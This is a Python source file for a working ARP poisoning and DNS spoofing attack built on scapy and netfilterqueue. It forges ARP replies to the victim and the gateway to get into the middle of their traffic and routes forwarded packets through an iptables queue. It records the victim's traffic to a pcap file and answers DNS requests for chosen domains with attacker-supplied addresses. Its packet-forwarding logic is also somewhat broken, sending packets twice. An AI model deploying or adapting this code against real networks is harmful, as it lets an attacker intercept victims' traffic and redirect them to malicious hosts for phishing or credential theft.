# Packages
import scapy.all as scapy
import sys, time, multiprocessing
from netfilterqueue import NetfilterQueue
import os

# Constants
DIVIDER = '=' * 60
POISON_BREAK = 30

# ARP DNS Spoofing Attack
class ARPDNSSpoofing():
    # Constructs the ARP DNS Spoofing Attack
    def __init__(self, victimIP, gatewayIP, dnsList, dnsIPList, interface):
        # Disables verbosity (command line) mode
        scapy.conf.verb = 0
        
        # Assign default scapy interface
        scapy.conf.iface = interface

        # Assign targets
        self.victimIP = victimIP
        self.gatewayIP = gatewayIP
        self.dnsList = dnsList
        self.dnsIPList = dnsIPList
        self.interface = interface

        # Assign macAddresses
        self.victimMac = scapy.getmacbyip(victimIP)
        if not self.victimMac: # If victim MAC not found
            raise ValueError("Cannot find MAC address for victim IP: {}".format(victimIP))

        self.gatewayMac = scapy.getmacbyip(self.gatewayIP)
        if not self.gatewayMac: # If gateway MAC not found
            raise ValueError("Cannot find MAC address for gateway IP: {}".format(self.gatewayIP))

        # Generate dns dictionary
        self.dnsDictionary = {(dnsList[index] + '.').encode(): dnsIPList[index] for index in range(len(dnsList))} # Assume right size

        self.deviceMac = scapy.get_if_hwaddr(interface)

    # Returns interactive prompt string
    def __repr__(self):
        return 'ARPDNSPoisoning({}, {})'.format(self.victimIP, self.interface)

    # Returns string representation
    def __str__(self):
        return 'ARP DNS Poisoning on {}:\n - Victim IP {} at {}'.format(
                self.interface, self.victimIP, self.victimMac)

    # Print Initialization Message
    def printInitializationMessage(self):
        print('{divider}\nRunning {str}\n{divider}'.format(divider = DIVIDER, str = self))
        print('Press [CTRL-C] to stop the ARP/DNS Poisoning and clean the ARP tables of the victims')

    # Execute the attack
    def execute(self):
        # Print initialization message
        self.printInitializationMessage()

        # Setup packets
        # ARP Poisoning packet for victim one
        victimPoisonPacket = scapy.ARP(hwsrc = self.deviceMac,
                           psrc = self.gatewayIP,
                           pdst = self.victimIP, 
                           hwdst = self.victimMac)

        # ARP Poisoning packet for victim two
        gatewayPoisonPacket = scapy.ARP(hwsrc = self.deviceMac,
                            psrc = self.victimIP,
                            pdst = self.gatewayIP,
                            hwdst = self.gatewayMac)

        # Prepare 
        self.setupIPTable()

        # Initializing subprocesses
        sniffingIncomingPacketsProcess = multiprocessing.Process(target = self.sniffIncomingPackets)
        spoofingIncomingPacketsProcess = multiprocessing.Process(target = self.spoofIncomingPackets)

        # Start processes
        sniffingIncomingPacketsProcess.start()
        spoofingIncomingPacketsProcess.start()

        # Infinitely poisons the victims
        while True:
            try: # Send poison packets
                scapy.send(victimPoisonPacket)
                scapy.send(gatewayPoisonPacket)
                time.sleep(POISON_BREAK)
            except KeyboardInterrupt: # CTRL-C was pressed
                spoofingIncomingPacketsProcess.join() # Wait for the spoofing to stop
                sniffingIncomingPacketsProcess.join() # Wait for the packet sniffing to stop
                self.clean() # Cleaning ARP tables of the victims and IP table
                break # Stop the poisoning-loop

    def setupIPTable(self):
        os.system("iptables -I FORWARD -j NFQUEUE --queue-num 0")

    # Sniffs incoming packets
    def sniffIncomingPackets(self):
        bpfFilter = 'ip host {}'.format(self.victimIP) 
        incomingPackets = scapy.sniff(filter = bpfFilter)
        scapy.wrpcap('captured_packets.pcap', incomingPackets)

    # Spoof incoming packets
    def spoofIncomingPackets(self):
        netfilterQueue = NetfilterQueue()
        
        try:
            netfilterQueue.bind(0, self.filterPackets)
            netfilterQueue.run()
        except KeyboardInterrupt:
            return

    def translatePacket(self, packet):
        rawPacket = packet.get_payload()

        return scapy.IP(rawPacket)

    # Filter packets
    def filterPackets(self, packet):
        packet = self.translatePacket(packet)

        if packet.haslayer(scapy.DNS):
            packetDNSLayer = packet.getlayer(scapy.DNS)
            requestedDomain = packetDNSLayer.qd.qname
            isTargetedDomain = requestedDomain in self.dnsDictionary
            isDNSRequest = packetDNSLayer.qr == 0
            if isTargetedDomain and isDNSRequest:
                print("The spoofed domain ({}) was requested".format(requestedDomain))
                # Original packet layers
                packetIPLayer = packet.getlayer(scapy.IP)
                packetUDPLayer = packet.getlayer(scapy.UDP)
                
                # Spoofed packet layers
                spoofedIPLayer = scapy.IP(dst = packetIPLayer.src,
                                src = packetIPLayer.dst) # Reverse IP sending direction
                spoofedUDPLayer = scapy.UDP(dport = packetUDPLayer.sport,
                                sport = packetUDPLayer.dport) # Reverse UDP sending direction
                spoofedDNSLayer = scapy.DNS(id = packetDNSLayer.id,
                                qr = 1,
                                aa = 1,
                                qd = packetDNSLayer.qd,
                                an = scapy.DNSRR(rrname = requestedDomain,
                                                ttl = 10,
                                                rdata = self.dnsDictionary.get(requestedDomain)))

                packet = spoofedIPLayer/spoofedUDPLayer/spoofedDNSLayer # Assemble and assign spoofed packet
                scapy.send(packet)
            else:
                scapy.sendp(packet)
        scapy.sendp(packet)

    # Clean ARP tables of the victims
    def clean(self):
        # Clean the victim's ARP Table
        scapy.send(scapy.ARP(
            op=2,
            psrc=self.gatewayIP,
            hwsrc=self.gatewayMac,
            pdst=self.victimIP,
            hwdst="ff:ff:ff:ff:ff:ff"), count=5)
        # Clean gateway's ARP Table
        scapy.send(scapy.ARP(
            op=2,
            psrc=self.victimIP,
            hwsrc=self.victimMac,
            pdst=self.gatewayIP,
            hwdst="ff:ff:ff:ff:ff:ff"), count=5)
        # Clean IP table
        os.system("iptables --flush")

    #check if the posioning was sucessful
    def check_arp_poisoning(self):
        # Send an ICMP echo request (ping) to the victim
        icmp = scapy.IP(dst=self.victimIP)/scapy.ICMP()
        response = scapy.sr1(icmp, timeout=2, verbose=0)

        if response is not None and response.src == self.victimIP and response[scapy.ICMP].type == 0:
            # We received an ICMP echo reply from the victim
            print("ARP poisoning appears to be successful")
        else:
            # We didn't receive a reply, or the reply wasn't what we expected
            print("ARP poisoning may not have been successful")
